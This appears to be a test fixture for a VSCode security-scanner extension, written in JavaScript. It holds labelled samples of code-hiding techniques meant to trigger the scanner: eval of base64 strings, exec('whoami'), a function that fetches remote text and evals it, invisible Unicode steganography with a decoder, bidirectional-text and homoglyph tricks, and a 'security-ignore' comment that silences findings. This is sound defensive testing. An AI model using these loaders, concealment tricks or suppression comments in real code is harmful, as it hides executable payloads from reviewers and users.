/**
 * Test Examples for Security Scanner
 * 
 * This file contains various test cases that should trigger detection.
 * Open this file in VSCode with the extension installed to see warnings.
 */

// ============================================================================
// TEST 1: Unicode Steganography (Critical Severity)
// ============================================================================
// Pattern: Sequences of invisible Unicode Variation Selectors
// The following line contains 30+ invisible characters

var hiddenPayload = '󠅔󠅝󠄶󠅩󠄹󠄶󠄩󠅖󠅉󠄣󠄺󠅜󠅉󠅈󠅂󠅜󠄹󠄴󠄠󠄠󠄠󠄠󠄠󠄠󠄠󠄠󠄠󠄠';
// Should trigger: "Potential Unicode steganography detected"

// ============================================================================
// TEST 2: Dynamic Code Execution (Critical Severity)
// ============================================================================
// Pattern: eval/Function with encoding functions

// Base64 decode and execute
eval(atob('Y29uc29sZS5sb2coImhpZGRlbiBjb2RlIik='));
// Should trigger: "Dynamic code execution pattern: eval with base64 decoding"

// Dynamic function creation
Function(atob('cmV0dXJuIDEgKyAx'))();
// Should trigger: "Dynamic code execution pattern: Function with base64"

// Buffer decoding
eval(Buffer.from('console.log("hidden")', 'utf8').toString());
// Should trigger: "Dynamic code execution pattern: eval with Buffer"

// Command execution
const { exec } = require('child_process');
exec('whoami', (err, stdout) => console.log(stdout));
// Should trigger: "Dynamic code execution pattern: child_process.exec"

// ============================================================================
// TEST 3: Excessive Indentation (High Severity)
// ============================================================================
// Pattern: Lines with unusual amounts of leading whitespace

                                                                                                                                                                                                                                                                                                    console.log('This code is hidden way off to the right!');
// Should trigger: "Unusual indentation detected: 300+ spaces"

// ============================================================================
// TEST 4: Zero-Width Characters (High Severity)
// ============================================================================
// Pattern: Invisible spacing/control characters in code

var username = 'admin​';  // Contains zero-width space after 'admin'
// Should trigger: "Invisible character detected"

var pass​word = 'secret';  // Zero-width space in middle
// Should trigger: "Invisible character detected"

// ============================================================================
// TEST 5: Bidirectional Text Controls (Critical Severity)
// ============================================================================
// Pattern: Bidirectional text control characters (CVE-2021-42574)

const isAdmin = false; /*‮ }⁦if(isAdmin)⁩ ⁦begin admin only */
// Should trigger: "Bidirectional text control character detected"

// Note: This line contains characters that alter text rendering direction
// Visual appearance may differ from actual execution order

// ============================================================================
// TEST 6: Non-ASCII Identifiers (High Severity)
// ============================================================================
// Pattern: Lookalike characters in identifiers (homoglyphs)

// Cyrillic 'а' (U+0430) instead of Latin 'a' (U+0061)
var аdmin = true;  // First character is Cyrillic 'а'
// Should trigger: "Non-ASCII character in identifier"

// Greek 'ο' (U+03BF) instead of Latin 'o' (U+006F)
function checkAuthοrization() {  // Contains Greek 'ο'
    return true;
}
// Should trigger: "Non-ASCII character in identifier"

// ============================================================================
// TEST 7: Private Use Area Characters (High Severity)
// ============================================================================
// Pattern: Private Use Area Unicode characters

var data = '\uE001\uE002\uE003\uE004\uE005\uE006\uE007\uE008\uE009\uE00A';
// Should trigger: "Potential Unicode steganography detected"

// ============================================================================
// TEST 8: Legitimate Unicode (Should NOT trigger warnings)
// ============================================================================
// These patterns should be allowed by default configuration

// Chinese characters in comment
// 这是一个正常的中文注释

// Japanese in comment
// これは通常の日本語コメントです

// Korean in comment
// 이것은 정상적인 한국어 주석입니다

// Emoji in comment
// This is a normal comment with emoji

// Arabic in comment
// هذا تعليق عادي بالعربية

// CJK in strings (legitimate)
const greeting = "你好世界"; // Hello World in Chinese
const name = "山田太郎";      // Japanese name

// Standard Unicode characters
const symbols = "© ® ™ € £ ¥";
const math = "π ≈ ∞ √ ∑";

// ============================================================================
// TEST 9: Combined Patterns
// ============================================================================
// Multiple suspicious patterns in sequence

// Payload retrieval with eval
async function getPayload() {
    const response = await fetch('https://example.com/data');
    const encrypted = await response.text();
    eval(atob(encrypted));
}
// Should trigger: "Dynamic code execution pattern"

// Decoder function with invisible characters
function decode(invisibleString) {
    const bytes = [];
    for (const char of invisibleString) {
        const code = char.codePointAt(0);
        if (code >= 0xE0100 && code <= 0xE01EF) {
            bytes.push(code - 0xE0100 + 16);
        }
    }
    return Buffer.from(bytes).toString('utf-8');
}

const hidden = '󠅔󠅝󠄶󠅩󠄹󠄶󠄩󠅖󠅉󠄣';
eval(atob(decode(hidden)));
// Should trigger: "Unicode steganography" + "Dynamic code execution"

// ============================================================================
// TEST 10: Format Control Characters (Medium Severity)
// ============================================================================
// Pattern: Unusual Unicode format control characters

var username = "admin\u00AD";  // Soft hyphen (invisible)
// Should trigger: "Invisible character detected"

var token = "ghp\u180E_token";  // Mongolian vowel separator
// Should trigger: "Invisible character detected"

// ============================================================================
// EXPECTED DETECTIONS SUMMARY
// ============================================================================
/*
When you open this file, you should see approximately:

Critical Severity (8 findings):
  - Unicode Steganography (TEST 1)
  - eval(atob(...)) patterns (TEST 2, multiple instances)
  - Bidirectional text controls (TEST 5)
  - Combined eval patterns (TEST 9)

High Severity (7 findings):
  - Excessive indentation (TEST 3)
  - Zero-width characters (TEST 4, multiple instances)
  - Non-ASCII identifiers (TEST 6, multiple instances)
  - Private Use Area characters (TEST 7)

Medium Severity (2 findings):
  - Format control characters (TEST 10, multiple instances)

No Warnings Expected (TEST 8):
  - CJK characters in comments
  - Legitimate Unicode in strings
  - Standard symbols and mathematical characters

Total Expected: Approximately 17 detections
*/

// ============================================================================
// HOW TO TEST
// ============================================================================
/*
1. Install the extension
2. Open this file in VSCode
3. Check the Problems panel (Ctrl+Shift+M / Cmd+Shift+M)
4. Look at the status bar (bottom right) for detection summary
5. Hover over underlined code to see details and context
6. Run "Security: Show Analysis Report" command for full report
7. Use "Security: Scan Current File" to manually trigger scan
*/

// ============================================================================
// SUPPRESSING FALSE POSITIVES
// ============================================================================
/*
To ignore a finding if it's a false positive, add a comment on the line before:
    // security-ignore: <reason>

Example:
    // security-ignore: This eval is for a build script and is safe
    eval(buildConfig);

Or use the Quick Fix action:
    1. Click on the warning/error
    2. Press Cmd+. (Mac) or Ctrl+. (Windows/Linux)
    3. Select "Ignore this finding (add security-ignore comment)"
*/

// ============================================================================
// TEST 11: Demonstrating False Positive Suppression
// ============================================================================

// This line WILL trigger a warning:
eval(atob('Y29uc29sZS5sb2coInRlc3QiKQ=='));

// This line will NOT trigger a warning (ignored):
// security-ignore: This eval is used in a controlled build environment
eval(atob('Y29uc29sZS5sb2coInRlc3QiKQ=='));

// This line will NOT trigger a warning (ignored with reason):
// security-ignore: Legitimate use for dynamic config loading in test suite
Function(atob('cmV0dXJuIDE='))();

// Another example with excessive indentation (ignored):
// security-ignore: Generated code with intentional formatting
                                                                                                                                                                                                                                                                                                    console.log('This is intentionally indented');

// Unicode steganography (ignored for legitimate internationalization):
// security-ignore: These characters are part of our i18n library
var i18nData = '󠅔󠅝󠄶󠅩󠄹󠄶󠄩󠅖󠅉󠄣󠄺';

